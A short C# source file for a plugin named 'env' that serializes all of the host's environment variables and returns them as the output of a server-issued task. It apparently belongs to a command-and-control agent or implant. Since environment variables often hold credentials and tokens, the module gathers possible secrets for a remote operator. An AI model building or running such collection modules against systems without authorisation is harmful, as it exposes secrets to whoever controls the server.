using Workflow.Contracts;
using System.Text.Json;
using Workflow.Models;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "env";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            string output = JsonSerializer.Serialize(Environment.GetEnvironmentVariables());

            messageManager.AddTaskResponse(new TaskResponse()
            {
                task_id = job.task.id,
                user_output = output,
                completed = true
            });
            DebugLog.Log($"{Name} completed [{job.task.id}]");
        }
    }
}
